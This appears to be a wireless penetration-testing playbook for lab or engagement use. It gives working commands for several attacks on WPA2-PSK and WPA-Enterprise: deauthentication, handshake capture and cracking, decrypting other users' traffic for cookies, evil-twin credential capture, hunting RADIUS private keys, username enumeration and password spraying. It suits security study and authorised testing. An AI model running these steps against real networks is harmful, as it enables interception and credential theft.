# Wireless (802.11) — PSK, WPA-Enterprise, and using radio as a pivot

For engagements where the path between network segments is a radio link rather
than a route. On a lab box this is usually simulated with `mac80211_hwsim`, which
behaves like real hardware for everything below: monitor mode, injection,
deauthentication, hostapd, wpa_supplicant.

## 0. Recognising that wireless is the path

Triggers, in the order you normally meet them:

- **`iw dev` lists `wlanN` interfaces you did not expect**, especially several of
  them with sequential locally-administered MACs (`02:00:00:00:0N:00`). That is
  `mac80211_hwsim`. Radios that are *down* are still radios.
- **A host with almost no TCP surface but an obvious internal role.** One SSH port
  and a diagram in the home directory is not a dead end.
- **An attack toolkit already installed** (`eaphammer`, `hostapd-wpe`, `hcxtools`,
  `aircrack-ng`). A box that ships the tool is telling you which attack it expects.
- **A `docker`/container foothold whose only neighbour is its own gateway.** If the
  wired segment is empty, the other segments are reachable some other way.

Always survey both bands. A 2.4 GHz-only scan misses the 5 GHz enterprise SSID:

```bash
ip link set wlanN down; iw dev wlanN set type monitor; ip link set wlanN up
airodump-ng --band abg -w survey --output-format csv wlanN
```

Read the CSV, not just the live view — the **station table at the bottom is the
important half**. It tells you which clients exist, which BSSID each is associated
to, and what SSIDs they *probe* for. A probe for an SSID that is not being
broadcast is a PNL entry and a karma/known-beacons lever.

`Authentication` column: `PSK` = pre-shared key, `MGT` = 802.1X/EAP (enterprise).

## 1. WPA2-PSK

### Getting a handshake when there is no client

`airodump-ng` is passive-ish and will show nothing on an SSID whose clients are
idle or asleep. `hcxdumptool` actively solicits: it answers beacons, sends
association requests and deauthentications, and will pull a handshake (or a PMKID)
out of a network `airodump-ng` reported as clientless.

```bash
echo "<BSSID-no-colons>" > filter.txt
hcxdumptool -i wlanN -o out.pcapng --filterlist=filter.txt --filtermode=2 --enable_status=3
```

Watch for `[FOUND AUTHORIZED HANDSHAKE]` or `[FOUND PMKID]`. `powned=N` in the
status line counts them. A station that appears here and nowhere else is normal —
do not conclude "no clients" from a passive scan alone.

### Cracking

Format juggling is the usual time sink; know the three shapes:

```bash
hcxpcapngtool -o hs.22000 out.pcapng      # hashcat 22000 (WPA*02*...)
editcap -F pcap out.pcapng out.cap        # aircrack-ng will NOT read pcapng
aircrack-ng -w rockyou.txt -b <BSSID> -l psk.txt out.cap
```

`john` will not load a 22000 line as `--format=wpapsk` (it wants hccapx), and
`aircrack-ng` will not read pcapng. Converting to `.cap` with `editcap` and using
`aircrack-ng` is the shortest path that always works. A lab PSK is usually a
rockyou word and falls in under two minutes; if it has not fallen in ten, it is
probably not the intended route.

### The PSK is a decryption key, not just an entry ticket

This is the part people forget. WPA2-PSK gives *everyone who knows the passphrase*
the ability to decrypt every other station's traffic on that SSID — the PTK is
derived from the PMK plus the 4-way handshake nonces, all of which are on the air.
So after cracking, do not just join the network: **listen to it**.

```bash
airodump-ng -c <ch> --bssid <BSSID> -w cap --output-format pcap wlanN
airdecap-ng -e "<SSID>" -p "<psk>" cap-01.cap      # -> cap-01-dec.cap
```

**`airdecap-ng` needs each station's 4-way handshake inside the same capture
file.** A capture that begins mid-session decrypts *zero* packets, which reads
exactly like a wrong passphrase. The fix is to force re-keying while you are
recording:

```bash
# start the capture, wait ~10s, then deauth into the same window
aireplay-ng --deauth 8 -a <BSSID> -c <STATION> wlanM
```

Then mine the plaintext. Filter *your own* address out first — your scanning
traffic will dominate the capture and hide the one host that matters:

```bash
tshark -r dec.cap -Y 'http.request && ip.src != <your-ip>' \
       -T fields -e ip.src -e http.request.full_uri -e http.cookie -e http.authorization
```

Cleartext HTTP on a wireless segment is a credential, a session cookie, or both.
Treat "I have the PSK" as "I have every unencrypted session on that SSID".

## 2. WPA-Enterprise (802.1X / EAP)

### The evil twin, and what it actually tests

```bash
eaphammer --bootstrap --cn <name> --country ES --state X --locale Y --org Z \
          --org-unit W --email a@b            # note: --locale, not --locality
eaphammer -i wlanN -e "<SSID>" -c <ch> --auth wpa-eap --creds
```

Clients already associated to the real AP need a nudge; deauthenticate them from
the *real* BSSID (enumerate every BSSID — enterprise SSIDs commonly have several)
and they will roam.

Then read the hostapd log, because it tells you exactly which control you are up
against:

- **`SSL3 alert ... fatal:unknown ca` / `tlsv1 alert unknown ca`** — the supplicant
  validates the RADIUS server certificate. It is configured correctly and a
  self-signed twin will never work. This is not a failure of the technique; it is
  a finding, and it redirects the engagement: **go find the RADIUS server's private
  key somewhere else on the estate.**
- **`mschapv2:` blocks with a challenge/response** — TLS was accepted, and you have
  an offline-crackable credential.

`--negotiate gtc-downgrade` and friends do not help against cert validation; they
change the *inner* method, and you never reach phase 2.

### Where the server key lives

The key is the whole game, so hunt it deliberately after any foothold on
infrastructure: access points, controllers, provisioning hosts, deployment scripts.

```bash
find / \( -name '*.key' -o -name '*.pem' -o -name 'ca.crt' -o -name 'server.crt' \) 2>/dev/null
grep -rlE 'BEGIN.{0,12}PRIV' /root /etc /opt /srv 2>/dev/null
ls -la */certs* */*-backup* 2>/dev/null
```

A `certs-backup/`, `*-sync.sh` or `send_certs.sh` under a service's install tree is
a credential drop by design — it usually carries the key *and* the destination
host's password. Once you have it:

```bash
eaphammer --cert-wizard import --server-cert server.crt --ca-cert ca.crt --private-key server.key
```

Re-run the same twin. The supplicants now complete TLS and hand over MSCHAPv2.

```bash
john --format=netntlm --wordlist=rockyou.txt netntlm.txt     # eaphammer emits jtr NETNTLM lines
```

The generalisable point for the report: enterprise wireless security rests on
*supplicant certificate validation*, and that control is only as strong as the
filesystem permissions on the server key. Correctly configured clients are
defeated completely by the organisation's own key.

### The inner-identity oracle

A cracked password that the real RADIUS refuses is usually the *identity format*,
not the password. Do not guess variants blindly — turn on verbose logging and read
where phase 2 dies:

```bash
wpa_supplicant -B -dd -i wlanN -c net.conf -f /tmp/w.log
grep -E 'Phase 2 Request: type=|Phase 2 Failure|EAP-SUCCESS' /tmp/w.log
```

Two distinguishable answers, and the asymmetry is a **free username oracle**:

| observed | meaning |
|---|---|
| `Phase 2 Request: type=1` then `code=4` (Failure) | identity unknown — server never offered an auth method |
| `Phase 2 Request: type=26` (MSCHAPv2 challenge) | **identity is valid**; a failure after this is a wrong password |

So sweep candidate identities and grade them on the phase-2 type. It enumerates
valid accounts with no credential at all, and it distinguishes "wrong username
format" from "wrong password" — which otherwise look identical. Domain-qualified
forms (`DOMAIN\user`) are common and are frequently *required*; `user@realm` and
bare `user` are not interchangeable.

Watch the escaping: in a `wpa_supplicant` config the line must read
`identity="DOMAIN\user"` with a single backslash. A quoted heredoc that emits
`\\` produces a different string and fails for a reason that looks like a bad
password.

### Joining, and the segment behind it

```
network={
    ssid="<SSID>"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="DOMAIN\user"
    password="<pass>"
    phase2="auth=MSCHAPV2"
    scan_ssid=1
}
```

`wpa_supplicant -B -i wlanN -c net.conf` then `dhclient wlanN`. Confirm with
`CTRL-EVENT-EAP-SUCCESS` *and* `CTRL-EVENT-CONNECTED` before blaming DHCP.

## 3. On the AP itself

Access points running `hostapd`/`hostapd-wpe` keep their configuration in
world-readable places more often than they should. After any shell on one:

```bash
ps aux | grep hostapd                     # names the config in use
ls -la /etc/hostapd/ /root/*/hostapd*     # config dir is often 755 even when /root is 700
cat /etc/hostapd/*.eap_user               # RADIUS user DB — MSCHAPV2 requires a reversible secret
cat /etc/hostapd/*.conf | grep -i passphrase
```

`hostapd_wpe.eap_user` stores 802.1X passwords **in cleartext** — MSCHAPv2 needs a
reversible secret, so this is inherent to the protocol; the file mode is not. Every
password in it is then worth spraying at local accounts, because service-credential
reuse for interactive logins is the norm on this kind of appliance.

`ap_isolate=1` in a hostapd config stops station-to-station traffic — note it, but
it does nothing against a passive listener who holds the PSK.

## 4. Operational notes that cost time if you learn them live

- **`eaphammer` calls `input()` and dies on stdin EOF** when backgrounded, right
  after printing `AP starting...`. Hold stdin open: `sleep 7200 | ./eaphammer …`,
  launched with `setsid` from a script file.
- **Never `pkill -f` a pattern that appears in your own command line** — over SSH
  it kills the session issuing it. Kill by PID (`ps -eo pid,cmd`).
- **A radio held by a dead run stays held.** If hostapd reports
  `nl80211: Could not configure driver mode` / `AP-DISABLED`, the interface is
  still owned by a previous process. Kill by PID, reset with
  `ip link set wlanN down; iw dev wlanN set type managed`, or just use a different
  radio.
- **5 GHz channels need `hw_mode=a`.** eaphammer warns and falls back on its own,
  but a hand-written hostapd config with `hw_mode=g channel=44` simply will not
  start.
- **Verify your rogue AP is actually beaconing** before concluding clients are
  ignoring it — a second monitor interface plus `airodump-ng` on that channel shows
  your BSSID and its beacon count. "No association" and "no beacon" look the same
  from the log.
- **Cleanup is not just files.** eaphammer rewrites interface MACs, sets PROMISC,
  and saves/replaces iptables (leaving `/tmp/rules_file.txt`). Restore MACs, clear
  PROMISC/ALLMULTI, put radios back down, and remove the rules file.
